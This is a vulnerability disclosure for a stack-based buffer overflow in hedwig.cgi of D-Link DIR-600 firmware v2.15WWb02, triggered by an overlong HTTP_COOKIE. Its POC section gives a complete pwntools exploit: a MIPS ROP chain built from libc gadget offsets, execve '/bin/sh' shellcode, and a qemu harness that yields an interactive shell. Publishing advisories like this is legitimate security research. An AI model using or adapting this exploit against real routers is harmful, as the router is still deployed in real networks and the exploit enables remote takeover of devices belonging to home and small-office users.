# Stack-Based Buffer Overflow Vulnerability in hedwig.cgi of D-Link DIR-600
## Vulnerability Summary
Vendor: D-Link  
Product: D-Link DIR-600  
Affected Component: `hedwig.cgi`  
Affected Version: Firmware **v2.15WWb02**  
Vulnerability Type: Stack-based Buffer Overflow  
Impact: Remote Code Execution
## Vulnerability Description
The D-Link DIR-600 is a wireless router designed for home and small office environments and is still deployed in certain real-world networks.

In firmware version **v2.15WWb02** of the D-Link DIR-600, a **stack-based buffer overflow vulnerability** exists in the CGI program `hedwig.cgi`.

When handling HTTP requests, the program retrieves user-controlled input directly from **environment variables** (such as `HTTP_COOKIE`) and copies the data into a fixed-size stack buffer **without performing any proper length validation**.

By supplying an overly long input, an attacker can trigger a stack buffer overflow, allowing overwriting of saved registers (including `$s0–$s7`) as well as the return address `$ra`.  
Through carefully crafted overflow data, an attacker is able to fully control the program execution flow and redirect execution to attacker-controlled data located on the stack, such as custom shellcode.
## Vulnerability Details
![](https://raw.githubusercontent.com/LonTan0/picgo/main/202512251651686.png)
![](https://raw.githubusercontent.com/LonTan0/picgo/main/202512251713888.png)
Within the `hedwigcgi_main` function of `cgibin/hedwig.cgi`, the program obtains user-supplied Cookie data through the `sess_get_uid` function, which internally retrieves values from environment variables corresponding to HTTP request headers (e.g., `HTTP_COOKIE`).

The retrieved data is fully attacker-controlled. During subsequent processing, the program fails to perform any effective length validation and directly copies the input into a fixed-size stack buffer using unsafe string handling functions such as `sprintf`.

As a result, when an attacker supplies an excessively long Cookie value, a stack buffer overflow occurs, allowing overwriting of critical stack data, including saved registers (`$s0–$s7`) and the function return address (`$ra`).

By exploiting this condition, an attacker can hijack the control flow of the program and redirect execution to attacker-controlled data (e.g., injected shellcode stored on the stack), ultimately achieving arbitrary code execution.
## POC
```python
from pwn import *
context(os = 'linux', arch = 'mips', log_level = 'debug')
 
libc_base = 0x2B300000
 
payload = b'a'*0x3cd
payload += b'a'*4
payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)
payload += b'a'*4
payload += p32(libc_base + 0x56BD0) # s3  sleep
payload += b'a'*(4*5)
payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
 
payload += b'a'*0x18
payload += b'a'*(4*4)
payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)
payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)
 
shellcode = asm('''
    slti $a2, $zero, -1
    li $t7, 0x69622f2f
    sw $t7, -12($sp)
    li $t6, 0x68732f6e
    sw $t6, -8($sp)
    sw $zero, -4($sp)
    la $a0, -12($sp)
    slti $a1, $zero, -1
    li $v0, 4011
    syscall 0x40404
''')
payload += b'a'*0x18
payload += shellcode
 
payload = b"uid=" + payload
post_content = "lontan0=Pwner"
io = process(b"""
    qemu-mipsel -L ./ \
    -0 "hedwig.cgi" \
    -E REQUEST_METHOD="POST" \
    -E CONTENT_LENGTH=11 \
    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
    -E HTTP_COOKIE=\"""" + payload + b"""\" \
    -E REQUEST_URI="2333" \
    ./htdocs/cgibin
""", shell = True)
io.send(post_content)
io.interactive()
```
The shellcode is successfully executed, resulting in an interactive shell:
![](https://raw.githubusercontent.com/LonTan0/picgo/main/202512251708404.png)